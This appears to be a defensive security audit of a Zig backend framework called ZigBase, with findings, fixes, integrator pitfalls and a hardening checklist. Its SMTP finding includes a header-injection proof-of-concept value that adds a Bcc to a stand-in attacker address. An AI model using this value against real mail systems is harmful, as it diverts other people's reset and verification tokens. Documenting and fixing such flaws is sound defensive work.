# ZigBase Security Audit

**Scope:** ZigBase v0.3.0 (single-binary PocketBase-style backend in Zig 0.16; SQLite-backed
REST + realtime + auth + file storage + embeddable framework).
**Date:** 2026-06-13.
**Perspectives:**

- **A — Stock ZigBase:** the shipped binary as deployed out-of-the-box.
- **B — Customized by a non-expert integrator:** hooks, custom routes, access rules, plugins —
  where the extension surface makes it easy to introduce a vulnerability.

Two findings were **fixed directly in this PR** (both with regression tests); the rest are
written up as recommendations. Several items in `KNOWN_LIMITATIONS.md` are re-assessed for
severity rather than re-reported as novel.

---

## Executive summary

The query/SQL layer is genuinely strong: every value reaching SQLite is bound as a parameter,
and every interpolated identifier (table/column/index/alias name) is gated through
`schema.isValidIdentifier` (letters/digits/underscore, must start with a letter) *before* it can
reach DDL or a join. The JWT implementation is header-pinned to HS256, verifies signatures in
constant time, and enforces `exp`. argon2id uses sane parameters. Password verify, CSRF, and
login-timing are all handled carefully. **No SQL-injection or auth-bypass was found in stock
ZigBase.**

The real exposure is at the **outbound and extension boundaries**: an unsanitized email-header
path (fixed here), an email field that accepted arbitrary control characters (fixed here), and a
set of **footguns for non-expert integrators** — chiefly that an empty-string access rule means
*allow-all* and a `null` rule means *deny*, an easy way to misconfigure a collection wide open.

### Findings table

| ID | Title | Class | Severity | Persp. | Exploitability | Status |
|----|-------|-------|----------|--------|----------------|--------|
| F1 | SMTP/RFC5322 header injection via `to`/`subject`/`from` | SSRF/Injection | **High** | A+B | Moderate (needs a record with a crafted email + SMTP configured) | **Fixed** |
| F2 | Email field accepts CR/LF/NUL and bogus addresses | Injection / data integrity | **Med** | A | Low alone; enables F1 | **Fixed** |
| F3 | Empty-string rule = allow-all; `null` = deny (inverted-from-intuition default) | Authz | **Med** | B | n/a (misconfig trap) | Recommended |
| F4 | Realtime `delete` events use coarse authz (existence leak) | Authz / Realtime | Low | A | Low (id-only leak) | Recommended (documented) |
| F5 | WS subscribe does not require auth | Authz / Realtime | Low | A | Low (delivery still viewRule-gated) | Recommended |
| F6 | JWT secret has a usable insecure default in non-HTTPS mode | Auth/Config | Med | A | Conditional (dev default in prod-without-TLS) | Recommended |
| F7 | Verification/reset tokens are not explicitly single-use | Auth | Low | A | Low (rotation + 1h TTL mitigate) | Recommended |
| F8 | Rate limiter keyed on spoofable `X-Forwarded-For` on direct exposure | DoS | Med | A | Moderate (direct exposure only) | Known-limitation; assessed |
| F9 | No global WS connection cap / no per-field body limit | DoS | Low/Med | A | Moderate | Recommended |
| F10 | Static dir mode follows symlinks out of root | Path traversal | Low | A | Low (operator must plant the symlink) | Known-limitation; assessed |
| F11 | OAuth `state` is delegated to the client, not enforced server-side | Auth/OAuth | Low/Med | A | Low (redirect-URI allowlist + PKCE present) | Recommended |
| F12 | Insecure deployment defaults (bind `0.0.0.0`, `cookie_secure=false`, open WS origins) | Config | Med | A | n/a (posture) | Recommended (checklist) |

Items deliberately re-assessed as **not exploitable**: rule **parse errors fail *closed*** (a
malformed rule yields a 500, the write never runs — see F3 notes); `expand` **does** re-apply the
target collection's `viewRule` per record; relation-path traversal is type-checked; multipart
filenames are sanitized; the static root rejects `..`/backslash/NUL lexically.

---

## Detailed findings

### F1 — SMTP / RFC5322 header injection (FIXED)

**Location:** `src/mail/mailer.zig` — `buildMessage` (was lines 351-357) and the SMTP command path
`runExchange` (`MAIL FROM` line ~197, `RCPT TO` line ~203).

**Description.** `email.to`, `email.subject`, and `self.from` were interpolated directly into the
`From:`/`To:`/`Subject:` RFC5322 headers and into the `MAIL FROM:<…>` / `RCPT TO:<…>` SMTP
command lines with **no CR/LF/NUL sanitization**. The values are reachable from attacker input:
`email.to` is the address a user supplies at signup or password-reset request, and the *mailer is
a public plugin entry point* (`Mailer.send`) that any integrator can call with arbitrary
`to`/`subject` (Perspective B). Before F2, the email field stored such values verbatim.

**PoC sketch.** Register / request reset with
`email = "victim@x.io\r\nBcc: attacker@evil.com"`. On the next send the message becomes:

```
To: victim@x.io
Bcc: attacker@evil.com
```

or, on the wire, an injected extra `RCPT TO:` / `DATA` — a header/command-injection that can BCC
an attacker, forge headers, or smuggle a second message body. Only effective once SMTP is
configured (the default `LogMailer` just logs), hence High rather than Critical.

**Fix.** Reject `\r`, `\n`, and NUL in `from`/`to`/`subject` at the mailer boundary
(`error.HeaderInjection`), in both `buildMessage` (headers) and `runExchange` (SMTP commands).
The message **body** is intentionally not checked — newlines there are legitimate data after the
header separator. Regression test: `buildMessage rejects CRLF header injection in to/subject/from`.

---

### F2 — Email field accepts control characters and bogus addresses (FIXED)

**Location:** `src/records.zig` — `validateFieldValue` (the `.email` field type previously fell
through to `else => {}`, i.e. **no validation at all**).

**Description.** An `email`-typed field accepted any string, including embedded `\r\n`/NUL and
addresses with no `@`. This is the *root enabler* of F1 (a record persisted with a CRLF address
re-injects on every later verification/reset send) and a general data-integrity problem.

**Fix.** Reject control chars (`\r`, `\n`, NUL) and spaces, and require a single `@` with
non-empty local and domain parts. This is intentionally *minimal* (not full RFC5322 — Zig's std
has no regex, mirroring the `text.pattern` non-enforcement noted in `KNOWN_LIMITATIONS.md`), but
it closes the injection class and the obviously-bogus cases. Clearing (empty/`null`) still works.
Regression test: `email field rejects control chars (CRLF/NUL) and obviously-bogus addresses`.

---

### F3 — Empty-string rule means allow-all; `null` means deny (Perspective B footgun)

**Location:** `src/rules.zig:14-19` (`decide`).

```zig
pub fn decide(rule: ?[]const u8, rctx: *const request.RequestContext) Decision {
    if (rctx.is_superuser) return .allow;
    const r = rule orelse return .deny_locked;   // null  -> deny (superuser only)
    if (r.len == 0) return .allow;               // ""    -> allow ANYONE
    return .check;                               // expr  -> evaluate per record
}
```

**Description.** This matches PocketBase semantics and is internally consistent, **but it is a
classic misconfiguration trap for a non-expert.** `null` (locked / superuser-only) is the safe
state, yet "" (empty string) — which looks like "no rule / blank / safer" — actually opens the
collection to the entire internet. A developer who clears a rule field in the admin UI, or sets
`.listRule = ""` in a comptime schema "as a placeholder", has just made the collection public.
This is **not fail-open on errors** — a *malformed* rule string fails closed: `compileGuard`
returns a lex/parse error that propagates as a 500 and the write never runs (verified in
`src/api/records.zig:218,280` — the error short-circuits before `records.*Guarded`). The risk is
purely the *deliberate* empty-string-equals-public semantics.

**Impact.** Silent, total read/write exposure of a collection from a one-character config choice.
Combined with `expand` (which correctly re-applies the *target's* `viewRule`), an empty viewRule
on a related collection also makes it expandable by anyone.

**Recommended guardrails (framework):**

- Make the admin UI render `null` vs `""` distinctly ("Locked (admins only)" vs **"Public —
  anyone"**) with a confirmation when switching a rule to public.
- Provide a startup/provision **lint** that logs a prominent warning for every collection with an
  empty-string rule (`"collection X is PUBLIC for <op> (empty rule)"`), so the wide-open state is
  never silent.
- Consider an explicit sentinel (`"@true"` or a typed `.public`) for allow-all so that "" can be
  reserved as a no-op, removing the trap entirely. (Behavior change — design decision, hence not
  done here.)

---

### F4 — Realtime `delete` events: coarse authorization (existence leak)

**Location:** `src/realtime/hub.zig:43-44`.

```zig
if (action == .delete) {
    return rules.decide(col.viewRule, &rctx) != .deny_locked;
}
```

**Description.** For `create`/`update`, `shouldDeliver` re-evaluates the collection `viewRule`
(plus the subscription filter) **per record** via a guarded `SELECT` — correct and tight (tests
`macro viewRule: only the owner receives the record`). For `delete` the row is already gone, so
per-record re-authorization is impossible; the code delivers the delete (an id-only `{ "id": … }`
frame, no body) to **any** subscriber whose `viewRule` isn't `null`-locked. A subscriber with an
owner-scoped `viewRule` (e.g. `owner = @request.auth.id`) thus learns that *some* record id was
deleted even if it was never theirs to view.

**Impact.** Low — leaks only record *ids* and their deletion timing for non-locked collections;
no record contents. Already acknowledged in the in-code comment.

**Recommendation.** Document explicitly in the realtime docs. If tighter behavior is wanted,
snapshot the deleted record's authorization *before* the delete commits (the writer already holds
the row in `existing` in `api/records.zig:307`) and pass that decision to the broadcast, so an
owner-scoped collection only notifies the owner.

---

### F5 — WS subscription does not require authentication

**Location:** `src/realtime/ws.zig:123-149` (`.subscribe` accepted with no auth check).

**Description.** A socket can `.subscribe` to any existing collection before (or without) sending
`.auth`. This is *largely defanged* because delivery is still gated by `hub.shouldDeliver`: for a
locked or owner-scoped collection an anonymous subscriber receives nothing on create/update. The
residual exposure is (a) the F4 delete-existence leak to anonymous subscribers on non-locked
collections, and (b) resource consumption from anonymous subscribers (see F9).

**Recommendation.** Optionally require `.auth` before `.subscribe` for collections whose
`viewRule` is not `""` (public); at minimum, document that delete events reach anonymous
subscribers on public collections.

---

### F6 — JWT secret insecure default usable in non-HTTPS mode

**Location:** `src/config.zig` (`jwt_secret = "dev-insecure-secret-change-me"`),
`src/framework.zig:439-444` (startup guard).

**Description.** If `ZIGBASE_JWT_SECRET` is unset the binary uses a well-known default. The
framework **refuses to start** with the default *only when* `cookie_secure` is enabled; otherwise
it boots with a `warn`. Anyone who knows the default can forge any auth/superuser JWT. The guard
is adequate for an HTTPS deployment (which sets `cookie_secure`) but a plaintext/proxied
deployment that forgets to set both can run with a guessable secret. Empty-string secret is also
not explicitly rejected, and no minimum length is enforced.

**Recommendation.** Reject an empty secret outright; warn (or refuse) on a secret shorter than 32
bytes; consider generating a random secret on first run and persisting it under the data dir, the
way many backends do, so "unset" is never "default."

---

### F7 — Verification / password-reset tokens not explicitly single-use

**Location:** `src/api/auth.zig:289-304` (confirm verification), `337-360` (confirm reset);
tokens minted in `mintToken` (`230-236`).

**Description.** Reset/verification tokens are signed JWTs with short TTLs (reset 1h, verify 7d)
and good entropy. Reuse is prevented only *incidentally*: confirming a reset rotates the user's
`tokenKey`, which invalidates the token's derived signing key — so a second confirm fails. There
is no explicit consumed-token store, so within the validity window before the legitimate user
acts, a leaked token could be redeemed (and, for verification, re-redeemed since verify doesn't
rotate the key).

**Recommendation.** Track consumed token ids (or bump a per-user token version on first
redemption) to make these strictly single-use, independent of the rotation side effect.

---

### F8 — Rate limiter keyed on spoofable `X-Forwarded-For` (re-assessed known limitation)

**Location:** `src/server.zig` (clientIp from `x-forwarded-for`/`x-real-ip`), `src/ratelimit.zig`.

**Assessment.** Documented in `KNOWN_LIMITATIONS.md`. Behind a trusted reverse proxy this is
fine. On **direct exposure** an attacker spoofs `X-Forwarded-For` per request and bypasses the
login/reset/verify limiter (the code falls back to a per-identity key, still spoofable). The
limiter also **fails open** under memory pressure (`ratelimit.zig` returns `true` when the entry
cap is hit and the sweep can't free room) — acceptable for availability but it means the limit
isn't a hard guarantee. Mitigation (require a proxy) is adequate *if followed*; the gap is that
nothing enforces it.

**Recommendation.** Add a config flag `trust_proxy` (default false). When false, key the limiter
on the real socket peer IP and ignore `X-Forwarded-For` entirely; only honor the header when
`trust_proxy` is set. This makes direct exposure safe by default.

---

### F9 — No global WS connection cap; no per-field body limit

**Location:** `src/realtime/ws.zig:19` (per-conn `MAX_SUBS = 256`, but no global cap);
`src/config.zig` (`max_upload_size = 50<<20` global only), `src/server.zig` listener.

**Assessment.** Per-connection subscriptions are bounded (256) and the global body cap (50 MiB)
is enforced at the listener. There is **no cap on concurrent WS connections** and **no per-field
size limit** within a body, so an attacker can open many sockets (each up to 256 subs) or send a
single 50 MiB body of many tiny multipart parts / deeply nested JSON. Filter nesting is bounded
at depth 32 (`query/parser.zig`), and `perPage` is an unbounded `u32` (large pages cost memory).

**Recommendation.** Add a global connection limit and a `perPage` clamp (e.g. max 500); consider a
multipart part-count cap. Low/Med because a single host's 50 MiB ceiling and reader/writer pool
already bound the worst case somewhat.

---

### F10 — Static dir mode follows symlinks (re-assessed known limitation)

**Location:** `src/static_files.zig` (`statFile` follows symlinks; lexical `..`/backslash/NUL
rejection is correct and tested).

**Assessment.** Documented. The lexical path safety is solid and verified. The only gap is that a
symlink *inside* the static root pointing outside it is followed (`statFile`, not `lstat`). This
requires an operator (or a compromised upload path — but uploads go to storage, not the static
root) to plant the symlink, so it's Low.

**Recommendation.** Use `lstat` and reject symlinked components, or `realpath` and verify the
result is still within the root, if you want defense against a hostile static tree.

---

### F11 — OAuth `state` delegated to the client

**Location:** `src/api/oauth.zig` (`authWithOAuth2Impl`), `src/oauth/client.zig`.

**Assessment.** ZigBase follows the PocketBase split: the **client** generates and checks the
`state`/PKCE pair and the SPA holds the verifier; the backend enforces (a) `redirect_url` against
a per-provider **exact-match allowlist** (`redirectAllowed`), (b) **https-only** effective
provider endpoints (`resolveProvider` → `isHttps`), and (c) requires the `codeVerifier` on
exchange (PKCE). CSRF on the OAuth flow therefore depends on the client honoring `state`. This is
a defensible design but it puts a security-critical step in integrator hands (Perspective B).

**Recommendation.** Document loudly that the client *must* generate and verify `state`; consider
an optional server-side state store for integrators who can't guarantee a correct SPA.

---

### F12 — Insecure deployment defaults

**Location:** `src/config.zig`.

- Default bind `0.0.0.0:8090` (all interfaces).
- `cookie_secure = false` (dev default).
- `realtime_allowed_origins = ""` → **any** WS Origin allowed.
- `jwt_secret` default (F6).

**Assessment.** Reasonable for local dev, risky if shipped unchanged. See hardening checklist.

---

## Footguns for non-expert integrators (Perspective B)

The framework invites custom rules, hooks, routes, and plugins. The sharp edges:

1. **Empty-string rule = public (F3).** The single most likely way to ship a wide-open
   collection. *Guardrail:* startup lint warning on every empty rule; distinct admin-UI wording;
   optional explicit `.public` sentinel.
2. **The mailer plugin trusts its inputs (F1).** `Mailer.send(to, subject, body)` is a public
   vtable; an integrator wiring a custom route that emails user input would have injected headers.
   *Guardrail (now in place):* the built-in builder/SMTP path rejects CR/LF/NUL in headers, so even
   a custom mailer that reuses `buildMessage` is protected; a *fully custom* backend still must
   sanitize — document this.
3. **`before`-hook writes are not transactional (KNOWN_LIMITATIONS).** A hook that does a side
   `ev.data.create(...)` for an "atomic" audit/log row will commit it even if the triggering write
   later fails — a correctness footgun that can become a security one (e.g. a "grant" row written
   before an authz failure). *Guardrail:* the docs already warn; consider routing hook writes
   through the request transaction in a later release.
4. **Rule `@request.data.*` is evaluated pre-hook (in-code KNOWN LIMITATION at
   `api/records.zig:213`).** A create/update rule like `@request.data.role != "admin"` can be
   defeated if a before-hook *sets* `role` after the guard was compiled — the WHERE clause saw the
   pre-hook value. A non-expert writing both a hook and a data-referencing rule may assume they
   compose. *Guardrail:* document; or recompile the guard post-hook.
5. **Custom routes get a raw `Data` facade.** `Data.create/update/delete/list` run with **no
   access-rule enforcement** (they're the privileged escape hatch). An integrator who exposes a
   custom route backed by `Data.list("users", …)` without re-checking the caller's identity leaks
   the whole collection. *Guardrail:* name/document the facade as privileged; consider a
   rule-respecting variant (`Data.listAs(ctx, …)`) so the safe path is the easy path.
6. **Email/URL field "validation" is minimal.** Integrators may assume `email`/`url` fields are
   format-validated. After F2, `email` rejects control chars and the gross-bogus cases, but it is
   not full RFC validation, and `url`/`text.pattern` are still unenforced (KNOWN_LIMITATIONS).
   *Guardrail:* document the exact guarantees.

---

## Hardening checklist for operators (stock ZigBase)

- [ ] Set a strong random `ZIGBASE_JWT_SECRET` (≥32 bytes). Never ship the default.
- [ ] Terminate TLS in front and set `cookie_secure=true` (this also makes the JWT-secret guard
      refuse the default).
- [ ] Bind to `127.0.0.1` and front with a reverse proxy, **or** firewall `0.0.0.0:8090`.
- [ ] Put ZigBase behind a proxy that sets `X-Forwarded-For` from the real peer; do **not** expose
      it directly while relying on the rate limiter (F8).
- [ ] Configure SMTP (`ZIGBASE_SMTP_*`) so verify/reset tokens are emailed, not logged. Leave
      `ZIGBASE_SMTP_INSECURE` off except for known self-signed relays.
- [ ] Set `realtime_allowed_origins` to your app origin(s); don't leave it empty in production.
- [ ] Audit every collection's list/view/create/update/delete rules. Treat an **empty** rule as
      **"public to the entire internet"** and confirm that's intended (F3).
- [ ] Don't place symlinks pointing outside the root inside a `--serve-static` directory (F10).
- [ ] Set a Sentry DSN if you want errors captured off-box; error responses to clients are already
      generic (no stack traces / SQL leaked — verified in `src/api/error.zig`).

---

## What was fixed in this PR

- **F1 / F2:** mailer header/command injection + email-field control-char validation, with two
  regression tests (`src/mail/mailer.zig`, `src/records.zig`). `zig build` and all 362 unit tests
  pass.

Everything else is a recommendation (design/behavior change, deployment posture, or doc work) and
is intentionally **not** half-implemented.
